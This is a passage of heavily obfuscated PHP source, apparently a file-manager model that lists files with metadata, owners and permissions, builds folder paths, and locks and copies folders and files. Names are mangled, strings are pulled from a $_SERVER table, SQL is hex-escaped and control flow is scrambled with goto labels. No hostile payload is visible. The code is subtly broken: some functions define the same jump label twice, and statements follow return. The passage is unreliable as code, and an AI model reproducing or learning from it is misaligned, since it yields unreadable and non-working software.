AuthModel::authDisable($Eވ[$eӾ[373]][$eӾ[374]], $bϳˈ); $Eވ[$eӾ[373]][$eӾ[414]][$eӾ[373]] = $Eވ[$eӾ[373]][$eӾ[374]]; } } goto bΟ; Cޜ: $eӾ =& $_SERVER[놫Ӱ]; $d = array($eӾ[380] => array($eӾ[381], $c֥狐)); $CՔɨތ = Model($eӾ[409])->field($eӾ[410])->where($d)->select(); goto B; bΟ: } protected function _listAppendFileMeta(&$D񙇷͹, $D) { goto Aխ; Aխ: $A̛ =& $_SERVER[놫Ӱ]; $fʗ陏 = array_to_keyvalue($D񙇷͹, $A̛[33], $A̛[415]); $fʗ陏 = array_filter(array_unique($fʗ陏)); goto fžö; C: foreach ($D񙇷͹ as &$bᯋٴ) { goto C; bȥ썱: $Cٵ[$A̛[78]] = $bᯋٴ[$A̛[78]]; $Cٵ[$A̛[28]] = $bᯋٴ[$A̛[28]]; self::$cacheFileInfo[$A̛[421] . $C] = $Cٵ; goto fи; e̚: if (isset($bᯋٴ[$A̛[159]][$A̛[422]])) { $bᯋٴ[$A̛[422]] = json_decode($bᯋٴ[$A̛[159]][$A̛[422]], !0); unset($bᯋٴ[$A̛[159]][$A̛[422]]); } goto Eː; fи: unset($Eߚ[$C][$A̛[76]]); $E = is_array($E[$C]) ? $E[$C] : array(); $bᯋٴ[$A̛[159]] = array_merge($E, $Eߚ[$C]); goto e̚; C: $C = $bᯋٴ[$A̛[415]]; if (!$C || !isset($Eߚ[$C])) { continue; } $Cٵ = $Eߚ[$C]; goto bȥ썱; Eː: } goto A갣; fžö: if (!$fʗ陏) { return; } $a = array($A̛[416] => array($A̛[381], $fʗ陏)); $Cðڙ = $A̛[417]; goto C㇡; Eاڢ: $fꔐ = $fꔐ ? $fꔐ : array(); $E = array(); foreach ($fꔐ as $fƹ) { if (!isset($E[$fƹ[$A̛[415]]])) { $E[$fƹ[$A̛[415]]] = array(); } $E[$fƹ[$A̛[415]]][$fƹ[$A̛[88]]] = $fƹ[$A̛[354]]; } goto C; C㇡: $Eߚ = Model($A̛[418])->field($Cðڙ)->where($a)->select(); $Eߚ = array_to_keyvalue($Eߚ, $A̛[415]); $fꔐ = Model($A̛[419])->field($A̛[420])->where($a)->select(); goto Eاڢ; A갣: } protected function _listAppendSourceInfo(&$aϰ, $d̬ܼ) { goto a; e: $Dřړ = array_to_keyvalue_group($Eġ, $B׏[366]); foreach ($aϰ as &$eϴ) { $eϴ[$B׏[388]] = array($B׏[426] => 0, $B׏[427] => 0, $B׏[428] => 0); if (isset($D茄[$eϴ[$B׏[366]]])) { $eϴ[$B׏[388]][$B׏[429]] = 1; $eϴ[$B׏[388]][$B׏[430]] = $D茄[$eϴ[$B׏[366]]][$B׏[28]]; } if (isset($dް[$eϴ[$B׏[366]]])) { $eϴ[$B׏[388]][$B׏[431]] = array(); foreach ($dް[$eϴ[$B׏[366]]] as $eԾ) { $b = $EԄ[$eԾ]; $eϴ[$B׏[388]][$B׏[431]][] = array($B׏[432] => $b[$B׏[364]], $B׏[383] => $b[$B׏[28]], $B׏[433] => $b[$B׏[434]]); } } if (isset($Dřړ[$eϴ[$B׏[366]]])) { $eϴ[$B׏[388]][$B׏[435]] = array(); foreach ($Dřړ[$eϴ[$B׏[366]]] as $b) { $eϴ[$B׏[388]][$B׏[435]] = array($B׏[436] => $b[$B׏[437]], $B׏[438] => $b[$B׏[439]], $B׏[440] => $b[$B׏[366]], $B׏[441] => $b[$B׏[442]], $B׏[443] => $b[$B׏[444]]); } } } return $aϰ; goto A̩Ţ; f󯛒: $Fܫĩ® = Model($B׏[389])->listData(); $c = Model($B׏[378])->listData(); $Eġ = Model($B׏[425])->listSimple(); goto b; b: $EԄ = array_to_keyvalue($A٭, $B׏[364]); $dް = array_to_keyvalue_group($Fܫĩ®, $B׏[76], $B׏[390]); $D茄 = array_to_keyvalue($c, $B׏[76]); goto e; a: $B׏ =& $_SERVER[놫Ӱ]; if (!defined($B׏[423])) { return; } $A٭ = Model($B׏[424])->listData(); goto f󯛒; A̩Ţ: } protected function _listAppendChildren(&$D톶, $f) { goto F󐏣; Aߌ: $Dѐ = 1024 * 50; $D͏ = count($D톶); $f۸Ŧ = $this->tablePrefix . $this->tableName; goto Fؑۜ; F󐏣: $Aܿ =& $_SERVER[놫Ӱ]; $d = $Aܿ[358]; $Eӷ = array(); goto Aߌ; Fؑۜ: for ($b͗ = 0; $b͗ < $D͏; $b͗++) { if ($D톶[$b͗][$Aܿ[367]]) { $C = $D톶[$b͗][$Aܿ[366]]; $d .= "\123\105\x4c\x45\x43\x54\40\52\40\106\122\117\x4d\x20\x28\123\105\x4c\105\x43\x54\x20\x27{$C}\x5f\150\x61\x73\106\x69\x6c\x65\x27\x20\141\163\40\150\x61\x73\x2c\x63\157\x75\156\164\50\61\51\x20\x61\x73\x20\x68\x61\x73\x43\x6f\165\x6e\x74\x20\106\122\x4f\115\x20\140{$f۸Ŧ}\140\40\12\x9\x9\x9\x9\x9\167\150\145\162\x65\40\160\141\162\x65\x6e\164\x49\104\x3d{$C}\40\x61\156\144\40\x69\163\106\157\x6c\144\145\x72\x3d\x30\x20\x61\x6e\144\x20\x69\163\x44\145\154\x65\x74\145\75\x30\x29\x20\141\163\x20\164\x62\x31\137{$C}\x20\x75\x6e\151\157\156\x20\x61\x6c\154\x20\12\x9\x9\11\11\x9\x53\x45\114\105\103\x54\x20\x2a\x20\x46\122\117\x4d\x20\50\x53\105\x4c\x45\103\x54\40\x27{$C}\x5f\150\x61\163\x46\x6f\154\x64\145\x72\47\40\x61\x73\40\x68\x61\163\106\151\x6c\x65\54\x63\157\165\x6e\164\50\61\51\40\141\x73\40\x68\x61\163\103\157\165\156\164\40\106\x52\x4f\x4d\x20\x60{$f۸Ŧ}\x60\x20\xa\11\x9\x9\x9\11\x77\150\x65\162\145\x20\160\141\162\x65\x6e\164\x49\x44\75{$C}\x20\141\156\144\x20\x69\x73\106\157\x6c\x64\145\x72\x3d\x31\x20\x61\156\x64\x20\x69\163\104\145\154\x65\x74\x65\x3d\x30\51\x20\141\x73\40\x74\x62\62\137{$C}\x20\x75\156\x69\x6f\x6e\x20\x61\154\154\40"; } if ((strlen($d) >= $Dѐ || $b͗ == $D͏ - 1) && $d) { $d = substr($d, 0, -strlen($Aܿ[445])); $cٽӰό = $this->query($d); $Eӷ = array_merge($Eӷ, $cٽӰό); $d = $Aܿ[33]; } } $Eӷ = array_to_keyvalue($Eӷ, $Aܿ[446]); foreach ($D톶 as &$A) { if ($A[$Aܿ[367]]) { unset($A[$Aܿ[369]]); $A[$Aܿ[189]] = intval($Eӷ[$A[$Aܿ[366]] . $Aܿ[447]][$Aܿ[448]]); $A[$Aܿ[188]] = intval($Eӷ[$A[$Aܿ[366]] . $Aܿ[449]][$Aܿ[448]]); } } goto f; f: } protected function _listAppendAuth(&$e) { goto e܏ҽ; e܏ҽ: $c夿 =& $_SERVER[놫Ӱ]; if (!defined($c夿[423])) { return; } $A = array(); goto bӣЌ; eߏ: $C = Model($c夿[450])->getSourceList($A, $Aǅǘ); foreach ($e as $bЂ => &$C홲) { $C홲[$c夿[373]] = $C[$C홲[$c夿[366]]]; if (!$C홲[$c夿[373]] && $C홲[$c夿[368]] == self::TYPE_GROUP) { $C홲[$c夿[373]] = Action($c夿[451])->pathGroupAuthMake($C홲[$c夿[452]]); if (!$C홲[$c夿[373]] && !$GLOBALS[$c夿[453]]) { $C홲[$c夿[186]] = !1; $C홲[$c夿[185]] = !1; } } if ($C홲[$c夿[373]]) { $C홲[$c夿[186]] = AuthModel::authCheckEdit($C홲[$c夿[373]][$c夿[374]]); $C홲[$c夿[185]] = AuthModel::authCheckView($C홲[$c夿[373]][$c夿[374]]); } $this->groupPathDisplay($C홲); } goto dϼ; bӣЌ: foreach ($e as $C홲) { if ($C홲[$c夿[368]] == self::TYPE_GROUP) { $A[] = $C홲[$c夿[366]]; } } if (!$A) { return; } $Aǅǘ = array_to_keyvalue($e, $c夿[366]); goto eߏ; dϼ: } public function groupPathDisplay(&$dȵ) { goto c; c: $Cߍ =& $_SERVER[놫Ӱ]; if ($dȵ[$Cߍ[368]] != self::TYPE_GROUP) { return; } $aҥ = Model($Cߍ[454])->getInfo($dȵ[$Cߍ[452]]); goto A; A: $b󐯣 = $this->parentLevelArray($aҥ[$Cߍ[455]]); $DՑ = $Cߍ[33]; foreach ($b󐯣 as $bӭÈ) { $eݸ = Model($Cߍ[454])->getInfo($bӭÈ); $DՑ .= $eݸ[$Cߍ[388]][$Cߍ[366]] . $Cߍ[47]; } goto E; E痥Ç: $dȵ[$Cߍ[460]] = $DՑ . $aҥ[$Cߍ[388]][$Cߍ[366]]; goto bΆ; E: $dȵ[$Cߍ[456]] = $aҥ[$Cߍ[457]]; $dȵ[$Cߍ[377]] = $aҥ[$Cߍ[455]]; $dȵ[$Cߍ[458]] = $aҥ[$Cߍ[459]]; goto E痥Ç; bΆ: } protected function _listAppendPath(&$e) { goto A; cۘخ΃: $aʒ = array(); foreach ($a as $EӒݞ => $Aġ) { if (!$Aġ) { $aʒ[] = $EӒݞ; } } if ($aʒ) { $C = array($Bƃ[380] => array($Bƃ[381], $aʒ)); if (count($aʒ) == 1) { $D鑃֬ = $this->sourceInfo($aʒ[0]); $D鑃֬ = is_array($D鑃֬) ? array($D鑃֬) : !1; } else { $D鑃֬ = $this->field($Bƃ[461])->where($C)->select(); } $Dӳ = array_to_keyvalue($D鑃֬, $Bƃ[366], $Bƃ[28]); $a = array_merge_index($a, $Dӳ); } goto bļڕ; A: $Bƃ =& $_SERVER[놫Ӱ]; $a = array(); foreach ($e as &$E) { $a[$E[$Bƃ[366]]] = $E[$Bƃ[28]]; $fڇ = $this->parentLevelArray($E[$Bƃ[455]]); array_shift($fڇ); foreach ($fڇ as $AǞ) { if (!isset($a[$AǞ])) { $a[$AǞ] = 0; } } } goto cۘخ΃; bļڕ: foreach ($e as &$E) { goto dѸې; dѸې: $fڇ = $this->parentLevelArray($E[$Bƃ[455]]); $A = $this->_listAppendPathRoot($E, $fڇ); foreach ($fڇ as $AǞ) { if (isset($a[$AǞ])) { $A .= $a[$AǞ] . $Bƃ[8]; } } goto dڿ; dڿ: if ($fڇ) { $A .= $E[$Bƃ[28]]; } if ($E[$Bƃ[367]]) { $A .= $Bƃ[8]; } $E[$Bƃ[462]] = str_replace($Bƃ[463], $Bƃ[8], $A); goto e鑆ܛ; e鑆ܛ: $Dƍ = trim($E[$Bƃ[462]], $Bƃ[8]); if ($E[$Bƃ[457]] == $Bƃ[464] && $Dƍ) { $E[$Bƃ[28]] = $Dƍ; } goto fǑ; fǑ: } goto dɊ쫇; dɊ쫇: } protected function _listAppendPathRoot(&$eЂ, $b݂) { $fА =& $_SERVER[놫Ӱ]; $e = $fА[33]; if ($eЂ[$fА[368]] == self::TYPE_USER) { if ($eЂ[$fА[452]] == USER_ID) { $e = LNG($fА[465]); if (!$b݂) { $eЂ[$fА[28]] = $e; } } else { $Fح͸ = Model($fА[466])->getInfoSimple($eЂ[$fА[452]]); $e = LNG($fА[467]) . $fА[154] . $Fح͸[$fА[28]] . $fА[468]; } } else { if ($eЂ[$fА[368]] == self::TYPE_GROUP) { $Fح͸ = Model($fА[454])->getInfoSimple($eЂ[$fА[452]]); $e = $Fح͸[$fА[28]]; } else { if ($eЂ[$fА[368]] == self::TYPE_SYSTEM) { $Fح͸ = $this->sourceInfo($b݂[0], !0); $e = $Fح͸[$fА[28]]; } } } $e = $e ? $fА[8] . $e . $fА[8] : $fА[8]; return $e; } protected function _listAppendUser(&$C˭ġ) { $fؑʙ =& $_SERVER[놫Ӱ]; $cΆ = array_to_keyvalue($C˭ġ, $fؑʙ[33], $fؑʙ[375]); $d߽ = array_to_keyvalue($C˭ġ, $fؑʙ[33], $fؑʙ[376]); $F֡늅 = array_merge($cΆ, $d߽); $b󟠒 = Model($fؑʙ[469])->userListInfo($F֡늅); foreach ($C˭ġ as &$eᴝվ) { $f˕꽟 = $eᴝվ[$fؑʙ[375]]; $eᴝվ[$fؑʙ[375]] = $b󟠒[$f˕꽟] ? $b󟠒[$f˕꽟] : !1; $f˕꽟 = $eᴝվ[$fؑʙ[376]]; $eᴝվ[$fؑʙ[376]] = $b󟠒[$f˕꽟] ? $b󟠒[$f˕꽟] : !1; if (isset($eᴝվ[$fؑʙ[413]]) && $eᴝվ[$fؑʙ[413]][$fؑʙ[470]]) { $F✦ = $GLOBALS[$fؑʙ[6]][$fؑʙ[84]][$fؑʙ[471]]; if ($eᴝվ[$fؑʙ[413]][$fؑʙ[472]] <= time() - $F✦) { $this->metaSet($eᴝվ[$fؑʙ[366]], $fؑʙ[470], null); $this->metaSet($eᴝվ[$fؑʙ[366]], $fؑʙ[472], null); unset($eᴝվ[$fؑʙ[413]][$fؑʙ[470]]); continue; } $DӺ = $eᴝվ[$fؑʙ[413]][$fؑʙ[470]]; $eᴝվ[$fؑʙ[413]][$fؑʙ[473]] = Model($fؑʙ[469])->getInfoSimpleOuter($DӺ); } } } public function parentLevelArray($bЍ) { $eІ =& $_SERVER[놫Ӱ]; $bЍ = explode($eІ[47], trim($bЍ, $eІ[47])); return array_remove_value($bЍ, $eІ[464]); } public function listAll($f徑) { goto C䅃; C䅃: $c܂ =& $_SERVER[놫Ӱ]; $F = $this->sourceInfo($f徑); $aԇѻ = array($c܂[474] => array($c܂[475], $F[$c܂[455]] . $f徑 . $c܂[476]), $c܂[477] => 0); goto e쐗; bݶ߻: $f璅 = array(); foreach ($A甄 as $c텞 => $BҸ) { goto d; d: $eΖ = $this->parentLevelArray($BҸ[$c܂[455]]); array_shift($eΖ); $eЈ = $D; goto C˗; b: $eЈ = str_replace($c܂[463], $c܂[8], $eЈ); $eЈ = str_replace($c܂[463], $c܂[8], $eЈ); $fǃ = array($c܂[384] => str_replace($c܂[463], $c܂[8], $eЈ), $c܂[480] => intval($BҸ[$c܂[367]]), $c܂[388] => $this->pathInfoFilter($BҸ, !0)); goto DԢҮ; DԢҮ: if (!$BҸ[$c܂[367]]) { $fǃ[$c܂[415]] = $BҸ[$c܂[415]]; $fǃ[$c܂[481]] = $BҸ[$c܂[76]]; } $f璅[] = $fǃ; goto f; C˗: for ($bǏɮ = 0; $bǏɮ < count($eΖ); $bǏɮ++) { $eЈ .= $A甄[$eΖ[$bǏɮ]][$c܂[28]] . $c܂[8]; } $eЈ .= $BҸ[$c܂[28]]; if ($BҸ[$c܂[367]]) { $eЈ .= $c܂[8]; } goto b; f: } return $f璅; goto d嘵; e쐗: $C = $c܂[478]; $b = "\x4c\x45\106\124\40\112\117\111\x4e\x20{$this->tablePrefix}\151\157\x5f\x66\151\x6c\145\x20\x66\151\154\145\40\x6f\156\x20\x73\157\x75\162\x63\x65\x2e\146\151\154\145\x49\104\x20\75\40\x66\151\154\x65\56\146\x69\x6c\145\x49\x44"; $A甄 = $this->alias($c܂[479])->field($C)->where($aԇѻ)->join($b)->select(); goto cՠ֎; cՠ֎: $this->_listAppendAuth($A甄); $this->_listAppendUser($A甄); $this->_listAppendPath($A甄); goto D; D: $A甄 = array_to_keyvalue($A甄, $c܂[366]); $D = "\x2f{$F[$c܂[28]]}\57"; $D = $D == $c܂[463] ? $c܂[8] : $D; goto bݶ߻; d嘵: } } class SourceListMoveModel extends SourceListModel { public function lockCopyStart($FӡĦ) { goto EǍ; dʢָ: $this->_lockCheckEnd($F̼đ[482], $FӡĦ); goto a䠒; AԲ: $this->_lockEvent($FӡĦ, array($F̼đ[483], $F̼đ[484]), $cە); $this->_lockParent($FӡĦ, array($F̼đ[484]), $cە); $this->_lockEvent($FӡĦ, array($F̼đ[485], $F̼đ[486]), $cە); goto dʢָ; EǍ: $F̼đ =& $_SERVER[놫Ӱ]; $this->_lockCheck($F̼đ[482], $FӡĦ); $cە = 1; goto AԲ; a䠒: } public function lockCopyEnd($F𶿦) { $fܔ =& $_SERVER[놫Ӱ]; $Aќ = 0; $this->_lockEvent($F𶿦, array($fܔ[483], $fܔ[484]), $Aќ); $this->_lockParent($F𶿦, array($fܔ[484]), $Aќ); $this->_lockEvent($F𶿦, array($fܔ[485], $fܔ[486]), $Aќ); } public function lockWriteStart($Bơ, $BÈ = '') { goto C񠳤; C񠳤: $c =& $_SERVER[놫Ӱ]; $this->_lockCheck($c[483], $Bơ); $C = 1; goto b; b: $this->_lockKey($c[487] . $Bơ . $c[92] . $BÈ, $C); $this->_lockEvent($Bơ, array($c[482], $c[484]), $C); $this->_lockParent($Bơ, array($c[482], $c[484]), $C); goto fņ; fņ: $this->_lockCheckEnd($c[483], $Bơ); goto f; f: } public function lockWriteEnd($D, $Dª = '') { $a辿Ǌ =& $_SERVER[놫Ӱ]; $aڕ = 0; $this->_lockKey($a辿Ǌ[487] . $D . $a辿Ǌ[92] . $Dª, $aڕ); $this->_lockEvent($D, array($a辿Ǌ[482], $a辿Ǌ[484]), $aڕ); $this->_lockParent($D, array($a辿Ǌ[482], $a辿Ǌ[484]), $aڕ); } public function lockMoveStart($e͸̡) { goto F; aΚ: $this->_lockKey($e[488] . $e͸̡, $A֔ѝ); $this->_lockEvent($e͸̡, array($e[482], $e[483]), $A֔ѝ); $this->_lockParent($e͸̡, array($e[482], $e[484]), $A֔ѝ); goto C 뫐; C 뫐: $this->_lockEvent($e͸̡, array($e[489], $e[485], $e[486]), $A֔ѝ); $this->_lockCheckEnd($e[484], $e͸̡); goto Cĥ; F: $e =& $_SERVER[놫Ӱ]; $this->_lockCheck($e[484], $e͸̡); $A֔ѝ = 1; goto aΚ; Cĥ: } public function lockMoveEnd($C) { $cŐ =& $_SERVER[놫Ӱ]; $bϴ = 0; $this->_lockKey($cŐ[488] . $C, $bϴ); $this->_lockEvent($C, array($cŐ[482], $cŐ[483]), $bϴ); $this->_lockParent($C, array($cŐ[482], $cŐ[484]), $bϴ); $this->_lockEvent($C, array($cŐ[489], $cŐ[485], $cŐ[486]), $bϴ); } private function _lockCheck($dഡ, $DÞ) { goto bӊ; bӊ: $F؏ =& $_SERVER[놫Ӱ]; $B = $this->sourceInfo($DÞ); $D = $dഡ . $F؏[92] . $DÞ; goto dވ͝; C: $dܭ = array_reverse($this->parentLevelArray($B[$F؏[455]])); foreach ($dܭ as $Bη) { $D = $dഡ . $F؏[491] . $Bη; if (CacheLock::lockGet($F؏[492] . $D)) { $B = $this->sourceInfo($Bη); CacheLock::setErrorMsg($F؏[154] . htmlspecialchars($B[$F؏[28]]) . $F؏[468] . $aϞ); $this->_lockKey($D, 1); $this->_lockKey($D, 0); } } goto d; f: CacheLock::setErrorMsg($F؏[154] . htmlspecialchars($B[$F؏[28]]) . $F؏[468] . $aϞ); $this->_lockKey($D, 1); $this->_lockKey($D, 0); goto C; dވ͝: $this->_lockTimeStart[$D] = timeFloat(); if (!is_array($B)) { return; } $aϞ = LNG($F؏[490]); goto f; d: } private function _lockCheckEnd($dŹ໒, $c霨) { goto eՑǋ; eՑǋ: $Bбƺ =& $_SERVER[놫Ӱ]; $B = $dŹ໒ . $Bбƺ[92] . $c霨; CacheLock::setErrorMsg($Bбƺ[358]); goto DŸ; DŸ: if (!isset($this->_lockTimeStart[$B])) { return; } $fƾ߱ = timeFloat() - $this->_lockTimeStart[$B]; unset($this->_lockTimeStart[$B]); goto eԆ; eԆ: if ($fƾ߱ > 0.5) { unset(self::$cacheSourceInfo[$Bбƺ[406] . $c霨]); } $Fޜ = $this->sourceInfo($c霨); if (!$Fޜ) { show_json(LNG($Bбƺ[101]), !1); } goto BҪ; BҪ: } private function _lockParent($Aڎ, $f񆌝, $F) { $AˆÊ = $this->sourceInfo($Aڎ); if (!is_array($AˆÊ)) { return; } $fȈ = array_reverse($this->parentLevelArray($AˆÊ[$_SERVER[놫Ӱ][455]])); foreach ($fȈ as $Eµ雚) { $this->_lockEvent($Eµ雚, $f񆌝, $F); } } private function _lockEvent($Eߟ, $aÓ, $B) { $bǔ =& $_SERVER[놫Ӱ]; foreach ($aÓ as $F) { $bߗ = $F . $bǔ[92] . $Eߟ; if ($B && CacheLock::lockGet($bǔ[492] . $bߗ)) { continue; } $this->_lockKey($bߗ, $B); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($e賒, $b = 1) { $dի = $_SERVER[놫Ӱ][492] . $e賒; if ($b) { if (isset(self::$_lockItemArr[$dի])) { return; } self::$_lockItemArr[$dի] = 1; CacheLock::lock($dի, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$dի])) { return; } unset(self::$_lockItemArr[$dի]); CacheLock::unlock($dի); } } public function isParentOf($B󢄭Ɉ, $dԏɞ) { goto FӮ౹ȝ; fܦ䩮: return $Cؼ; goto dܵ; FӮ౹ȝ: $cҐ؛Н =& $_SERVER[놫Ӱ]; $c϶ܮ = $this->sourceInfo($B󢄭Ɉ); $F = $this->sourceInfo($dԏɞ); goto D; D: $fƆ = $c϶ܮ[$cҐ؛Н[455]] . $c϶ܮ[$cҐ؛Н[366]] . $cҐ؛Н[47]; $c = $F[$cҐ؛Н[455]] . $F[$cҐ؛Н[366]] . $cҐ؛Н[47]; $Cؼ = strpos($c, $fƆ) === 0; goto fܦ䩮; dܵ: } public function copy($B֕ݚ, $Aڲ, $cӏ = REPEAT_REPLACE, $Aݚ = '') { goto F; eҼ: Model($E[497])->addAll($Bω[$E[495]], array(), !0); Model($E[498])->eventCopy($E񤗎); $this->saveAll($Bω[$E[496]]); goto aģѾŘ; aģѾŘ: Model($E[164])->linkAdd($Bω[$E[494]]); $this->folderSizeReset($Aڲ); $this->updateModifyTime($Aڲ); goto fѿ; Cݮ: $this->lockCopyEnd($B֕ݚ); $this->lockWriteEnd($Aڲ, $B); if ($C[$E[367]] == $E[493] && $A쫋 == $E񤗎) { $this->folderSizeResetChildren($A쫋); } goto eҼ; fѿ: return $E񤗎; goto FО; FІ: if (!$C || !$Eú || $Eú[$E[367]] != $E[493]) { return !1; } if ($this->isParentOf($B֕ݚ, $Aڲ)) { return !1; } $B = $Aݚ ? $Aݚ : $C[$E[28]]; goto F; F: $this->lockCopyStart($B֕ݚ); $this->lockWriteStart($Aڲ, $B); $Bω = array($E[494] => array(), $E[495] => array(), $E[496] => array()); goto f; F: $E =& $_SERVER[놫Ӱ]; $C = $this->sourceInfo($B֕ݚ); $Eú = $this->sourceInfo($Aڲ); goto FІ; f: $A쫋 = $this->fileNameExistCache($Aڲ, $C[$E[28]]); $E񤗎 = $this->_copy($B֕ݚ, $Aڲ, $cӏ, $Bω, !0, $Aݚ); $this->_childrenListClear(); goto Cݮ; FО: } private function _copy($Aũ, $Bˇ, $E֤ч, &$bԢ, $fՉϊ, $c = '') { goto Cˤ; Cˤ: $b쓫Ϛ =& $_SERVER[놫Ӱ]; $E牞 = $this->sourceInfoCache($Aũ); $e = $E牞[$b쓫Ϛ[367]] == $b쓫Ϛ[493]; goto cݵ; C: return $a; goto cˋ; cݵ: $eݿ = $c ? $c : $E牞[$b쓫Ϛ[28]]; $dҸ֮ = $this->fileNameExistCache($Bˇ, $eݿ); if ($fՉϊ) { $this->_childrenAllMake($Aũ); if ($e && $dҸ֮) { $this->_childrenAllMake($dҸ֮); } } goto C; C: if (!$dҸ֮) { return $this->_copyCreate($Aũ, $Bˇ, $eݿ, $bԢ); } $a = $dҸ֮; if ($e) { if ($E֤ч == REPEAT_RENAME_FOLDER) { $eݿ = $this->fileNameAutoCache($Bˇ, $eݿ, $E֤ч, $e); $a = $this->_copyCreate($Aũ, $Bˇ, $eݿ, $bԢ); } else { $Fꗾ = $this->_childrenList($Aũ); foreach ($Fꗾ as $a) { $this->_copy($a[$b쓫Ϛ[366]], $dҸ֮, $E֤ч, $bԢ, !1); } } } else { if ($E֤ч == REPEAT_RENAME || $E֤ч == REPEAT_RENAME_FOLDER) { $eݿ = $this->fileNameAutoCache($Bˇ, $eݿ, $E֤ч, $e); $a = $this->_copyCreate($Aũ, $Bˇ, $eݿ, $bԢ); } else { if ($E֤ч == REPEAT_REPLACE) { $aў = $this->sourceInfoCache($dҸ֮); $d = $this->fileHistory($aў, $E牞[$b쓫Ϛ[415]], $E牞[$b쓫Ϛ[78]]); if ($d) { $bԢ[$b쓫Ϛ[494]][] = $E牞[$b쓫Ϛ[415]]; } } else { if ($E֤ч == REPEAT_SKIP) { } } } Hook::trigger($b쓫Ϛ[499], array($b쓫Ϛ[500], $E牞, 0)); } goto C; cˋ: } private function _copyCreate($A҉, $a˜ۓ, $Aڥ, &$eɳ컆) { goto dꆊ; Dʈɪ: $this->addAll($AӔ, array(), !1); $Eɴɑ = $this->where(array($ağ[457] => $c))->select(); $aϒ = $this->_childrenMakeRelation($eׂؗ, $Eɴɑ); goto Fɋֽ; d붷Ζ: if ($Fؒʘ[$ağ[367]] != $ağ[493]) { $eɳ컆[$ağ[494]][] = $Fؒʘ[$ağ[415]]; return $c; } $eׂؗ = array(); $AӔ = array(); goto Cޅ; d܉յ: foreach ($Eɴɑ as $C) { $eɟ֣ = $C[$ağ[366]]; $eи = $this->_childrenMatch($aϒ, $C, $B); $eի[] = array($ağ[366], $eɟ֣, $ağ[457], $eи[$ağ[457]]); $eݶ[] = array($ağ[366], $eɟ֣, $ağ[455], $eи[$ağ[455]]); $this->_copyApplyMeta($C, $eɳ컆); if ($C[$ağ[367]] != $ağ[493]) { $eɳ컆[$ağ[494]][] = $C[$ağ[415]]; } } $this->chunkEventSet($ağ[506], array($ağ[507], $fó, $C긘މ)); $this->saveAll($eի); goto aàʷʓ; Fɋֽ: $aϒ[$A҉] = $c; $eի = array(); $eݶ = array(); goto d܉յ; dꆊ: $ağ =& $_SERVER[놫Ӱ]; $Fؒʘ = $this->sourceInfoCache($A҉); $F࢜ = $this->sourceInfoCache($a˜ۓ); goto CƤ; Cޅ: $this->_childrenListAll($A҉, $eׂؗ); $C긘މ = count($eׂؗ); if ($C긘މ == 0) { return $c; } goto Eڌ; CƤ: $fó = $this->_makeItemData($Fؒʘ, $F࢜, $Aڥ); Hook::trigger($ağ[501], $fó); Hook::trigger($ağ[502], array($ağ[503], $fó, 0)); goto F; aàʷʓ: $this->chunkEventSet($ağ[508], array($ağ[509], $fó, $C긘މ)); $this->saveAll($eݶ); return $c; goto cɂ; F: $c = $this->add($fó); $f = array($ağ[366] => $c, $ağ[28] => $Aڥ); $this->_copyApplyMeta($f, $eɳ컆); goto d붷Ζ; Eڌ: $B = $this->sourceInfo($c); foreach ($eׂؗ as $C) { $e = $this->_makeItemData($C, $B, $C[$ağ[28]]); $e[$ağ[455]] = $C[$ağ[455]]; $AӔ[] = $e; } $this->chunkEventSet($ağ[504], array($ağ[505], $fó, $C긘މ)); goto Dʈɪ; cɂ: } private function _childrenMakeRelation($Fﰷݲ, $Bߪ) { $Ať =& $_SERVER[놫Ӱ]; $eɡ = array(); $B = array(); foreach ($Fﰷݲ as $DÝ) { $b̓ = $DÝ[$Ať[28]] . $Ať[8] . $DÝ[$Ať[455]]; $eɡ[$b̓] = $DÝ[$Ať[366]]; } foreach ($Bߪ as $DÝ) { $b̓ = $DÝ[$Ať[28]] . $Ať[8] . $DÝ[$Ať[455]]; $bڈڃ = $eɡ[$b̓]; $B[$bڈڃ] = $DÝ[$Ať[366]]; } return $B; } private function _childrenMatch($aƵ, $EԼ, $c) { goto aЌҡ; C: foreach ($a䂛윂 as $F) { if (isset($aƵ[$F])) { $B .= $aƵ[$F] . $Eي[510]; } } $B = rtrim($B, $Eي[47]) . $Eي[47]; $bך¯ = $this->parentLevelArray($B); goto Cڟ; aЌҡ: $Eي =& $_SERVER[놫Ӱ]; $B = $c[$Eي[455]]; $a䂛윂 = $this->parentLevelArray($EԼ[$Eي[455]]); goto C; Cڟ: $Fڸ = $bך¯[count($bך¯) - 1]; return array($Eي[457] => $Fڸ, $Eي[455] => $B); goto C; C: } private function _makeItemData($E, $eű茿, $D) { $f =& $_SERVER[놫Ӱ]; $Eꃟ = array($f[511] => $E[$f[367]], $f[383] => $D, $f[512] => $E[$f[369]], $f[416] => $E[$f[415]], $f[513] => $E[$f[78]], $f[514] => $eű茿[$f[368]], $f[515] => $eű茿[$f[452]], $f[516] => USER_ID, $f[517] => USER_ID, $f[365] => $eű茿[$f[366]], $f[518] => $eű茿[$f[455]] . $eű茿[$f[366]] . $f[47], $f[392] => 0); return $Eꃟ; } private function _copyApplyMeta($Bۭ, &$eʰ) { $b𻐈 =& $_SERVER[놫Ӱ]; $bǣ = $Bۭ[$b𻐈[366]]; $B栄ק = $Bۭ[$b𻐈[28]]; if (!isset($Bۭ[$b𻐈[519]]) || !$Bۭ[$b𻐈[519]] || $Bۭ[$b𻐈[519]] == $b𻐈[464]) { $eʰ[$b𻐈[496]][] = array($b𻐈[366], $bǣ, $b𻐈[519], short_id($bǣ)); } if (Input::check($B栄ק, $b𻐈[520])) { $eʰ[$b𻐈[495]][] = array($b𻐈[366] => $bǣ, $b𻐈[88] => $b𻐈[412], $b𻐈[354] => str_replace($b𻐈[50], $b𻐈[33], Pinyin::encode($B栄ק))); $eʰ[$b𻐈[495]][] = array($b𻐈[366] => $bǣ, $b𻐈[88] => $b𻐈[411], $b𻐈[354] => Pinyin::encode($B栄ק, $b𻐈[521])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Bߣё) { goto D¦; D¦: $C״ =& $_SERVER[놫Ӱ]; $Eƺ = $this->sourceInfo($Bߣё); $B͔֓ = $C״[522]; goto dˍݙ; dˍݙ: $Cˬ֗ = array($C״[455] => array($C״[475], $Eƺ[$C״[455]] . $Bߣё . $C״[476]), $C״[393] => 0); $cъ = $this->field($B͔֓)->where($Cˬ֗)->select(); if (!$cъ) { return; } goto d̃; d̃: $cъ = array_to_keyvalue($cъ, $C״[366]); foreach ($cъ as $c؆) 